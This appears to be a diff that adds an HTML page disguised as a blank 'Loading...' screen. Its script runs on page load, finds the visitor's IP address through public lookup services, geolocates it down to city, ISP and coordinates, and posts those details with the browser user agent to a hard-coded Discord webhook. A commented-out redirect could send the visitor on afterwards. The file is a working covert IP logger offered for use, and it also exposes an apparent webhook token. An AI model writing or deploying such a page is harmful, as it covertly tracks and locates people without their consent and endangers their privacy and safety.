@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: white;
+        }
+    </style>
+</head>
+<body>
+    <script>
+        const webhookURL = 'https://discord.com/api/webhooks/1486478734608306297/PFCk902aLwb93KlsUCIe3e8X-MujTN-pN2X_x0zMpjf7JjougZacnApQDS5Z33B2a-Kx';
+
+        async function getIP() {
+            const services = [
+                'https://api.ipify.org?format=json',
+                'https://ipinfo.io/json',
+                'https://httpbin.org/ip'
+            ];
+            for (const service of services) {
+                try {
+                    const res = await fetch(service);
+                    const data = await res.json();
+                    let ip = data.ip || data.origin;
+                    if (ip) return ip;
+                } catch(e) {}
+            }
+            return null;
+        }
+
+        async function getLocation(ip) {
+            try {
+                const res = await fetch(`https://ip-api.com/json/${ip}?fields=status,country,city,regionName,isp,lat,lon,query`);
+                const data = await res.json();
+                if (data.status === 'success') return data;
+            } catch(e) {}
+            return { city: 'Unknown', country: 'Unknown', isp: 'Unknown', regionName: 'Unknown', lat: 'N/A', lon: 'N/A' };
+        }
+
+        async function sendToDiscord(ip, location, ua) {
+            const message = {
+                content: `**IP Logged**\n\`\`\`\nIP: ${ip}\nCity: ${location.city}\nRegion: ${location.regionName}\nCountry: ${location.country}\nISP: ${location.isp}\nLat/Lon: ${location.lat}, ${location.lon}\nUA: ${ua}\nTime: ${new Date().toLocaleString()}\n\`\`\``
+            };
+            await fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(message)
+            }).catch(() => {});
+        }
+
+        (async function() {
+            const ip = await getIP();
+            if (ip) {
+                const location = await getLocation(ip);
+                await sendToDiscord(ip, location, navigator.userAgent);
+            }
+            // Optional: redirect after logging
+            // window.location.href = 'https://example.com';
+        })();
+    </script>
+</body>
+</html>
